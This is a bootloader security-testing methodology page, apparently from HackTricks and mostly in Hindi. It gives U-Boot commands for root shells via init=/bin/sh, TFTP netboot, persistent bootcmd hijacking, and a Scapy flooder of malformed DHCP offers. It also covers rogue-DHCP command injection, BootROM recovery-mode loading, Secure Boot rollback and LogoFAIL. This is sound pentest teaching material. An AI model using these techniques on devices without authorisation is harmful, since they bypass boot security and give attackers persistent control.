# बूटलोडर परीक्षण

{{#include ../../banners/hacktricks-training.md}}

निम्नलिखित कदम उपकरण के स्टार्टअप कॉन्फ़िगरेशन को बदलने और U-Boot और UEFI-class loaders जैसे बूटलोडरों का परीक्षण करने के लिए सुझाए जाते हैं। प्रारंभिक कोड एक्सेक्यूशन प्राप्त करने, signature/rollback प्रोटेक्शंस का आकलन करने, और recovery या network-boot पाथ का दुरुपयोग करने पर ध्यान दें।

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- बूट के दौरान, `bootcmd` के निष्पादन से पहले किसी ज्ञात break की दबाएँ (आम तौर पर कोई भी की, 0, space, या बोर्ड-विशिष्ट "magic" अनुक्रम) ताकि U-Boot prompt पर ड्राॅप किया जा सके।

2. Inspect boot state and variables
- उपयोगी कमांड:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- `init=/bin/sh` जोड़ें ताकि kernel सामान्य init के बजाय शैल पर गिरे:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- नेटवर्क कॉन्फ़िगर करें और LAN से kernel/fit image प्राप्त करें:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- यदि env storage write-protected नहीं है, तो आप नियंत्रण को स्थायी कर सकते हैं:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- ऐसे वेरिएबल्स की जाँच करें जैसे `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जो fallback paths को प्रभावित करते हैं। गलत कॉन्फ़िगर किए गए मान बार-बार शैल में ब्रेक हासिल करने दे सकते हैं।

6. Check debug/unsafe features
- देखें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के जरिए `loady`/`loads` की क्षमता, untrusted media से `env import`, और kernels/ramdisks जो signature checks के बिना लोड होते हैं।

7. U-Boot image/verification testing
- यदि प्लेटफ़ॉर्म FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images दोनों आज़माएँ:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` की अनुपस्थिति या legacy `verify=n` व्यवहार अक्सर arbitrary payloads को बूट करने की अनुमति देता है।

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot के legacy BOOTP/DHCP हैंडलिंग में memory-safety समस्याएँ रही हैं। उदाहरण के लिए, CVE‑2024‑42040 crafted DHCP responses के माध्यम से memory disclosure का वर्णन करता है जो U-Boot memory से bytes को वायर पर वापस leak कर सकता है। DHCP/PXE कोड पाथ्स को अत्यधिक लंबे/एज-केस मानों (option 67 bootfile-name, vendor options, file/servername fields) के साथ एक्सरसाइज़ करें और हैंग/लेक्स के लिए निगरानी करें।
- netboot के दौरान boot parameters को stress देने के लिए Minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- यह भी सत्यापित करें कि क्या PXE filename fields shell/loader लॉजिक को बिना sanitization के पास किए जा रहे हैं जब उन्हें OS-side provisioning scripts से चेन किया जाता है।

9. Rogue DHCP server command injection testing
- एक rogue DHCP/PXE सर्विस सेट करें और filename या options फ़ील्ड्स में characters inject करने की कोशिश करें ताकि बूट चेन के बाद के चरणों में command interpreters तक पहुँच बनाई जा सके। Metasploit’s DHCP auxiliary, `dnsmasq`, या कस्टम Scapy स्क्रिप्ट्स काम आते हैं। पहले लैब नेटवर्क को अलग रखें।

## SoC ROM recovery modes that override normal boot

कई SoC एक BootROM "loader" mode एक्सपोज़ करते हैं जो USB/UART पर कोड स्वीकार करेगा भले ही flash images invalid हों। यदि secure-boot fuses नहीं जले हैं, तो यह chain में बहुत जल्दी arbitrary code execution प्रदान कर सकता है।

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

जांचें कि क्या डिवाइस में secure-boot eFuses/OTP बर्न किए गए हैं। यदि नहीं, तो BootROM download modes अक्सर किसी भी उच्च-स्तरीय verification (U-Boot, kernel, rootfs) को बायपास कर देते हैं और SRAM/DRAM से सीधे आपका first-stage payload execute कर लेते हैं।

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- EFI System Partition (ESP) को माउंट करें और loader components की जाँच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
- यदि Secure Boot revocations (dbx) current नहीं हैं, तो डाउनग्रेडेड या ज्ञात-लचीले signed boot components के साथ बूट करने की कोशिश करें। यदि प्लेटफ़ॉर्म अभी भी पुराने shims/bootmanagers पर भरोसा करता है, तो आप अक्सर ESP से अपना kernel या `grub.cfg` लोड करके persistence प्राप्त कर सकते हैं।

11. Boot logo parsing bugs (LogoFAIL class)
- कई OEM/IBV firmware DXE में बूट लोगो को प्रोसेस करने वाली image-parsing कमजोरियों के शिकार रहे हैं। यदि एक अटैकर ESP पर vendor-specific path (उदाहरण: `\EFI\<vendor>\logo\*.bmp`) में crafted image रख सकता है और reboot करता है, तो शुरुआती बूट के दौरान कोड एक्सेक्यूशन संभव हो सकता है भले ही Secure Boot सक्षम हो। परीक्षण करें कि प्लेटफ़ॉर्म user-supplied logos स्वीकार करता है या नहीं और क्या वे paths OS से writable हैं।

## Hardware caution

प्रारंभिक बूट के दौरान SPI/NAND flash के साथ इंटरैक्ट करते समय सतर्क रहें (उदा., reads को बायपास करने के लिए pins को ग्राउंड करना) और हमेशा flash datasheet को परामर्श करें। गलत समय पर शॉर्ट्स डिवाइस या प्रोग्रामर को करप्ट कर सकते हैं।

## Notes and additional tips

- `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ ताकि environment blobs को RAM और storage के बीच ले जाया जा सके; कुछ प्लेटफ़ॉर्म removable media से बिना authentication के env import करने की अनुमति देते हैं।
- extlinux.conf के माध्यम से बूट होने वाले Linux-based systems पर persistence के लिए boot partition में `APPEND` लाइन (जैसे `init=/bin/sh` या `rd.break` इंजेक्ट करना) अक्सर पर्याप्त होता है जब signature checks लागू नहीं हैं।
- यदि userland `fw_printenv/fw_setenv` प्रदान करता है, तो सत्यापित करें कि `/etc/fw_env.config` वास्तविक env storage से मेल खाता है। गलत offsets आपको गलत MTD region पढ़ने/लिखने की अनुमति दे सकते हैं।

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
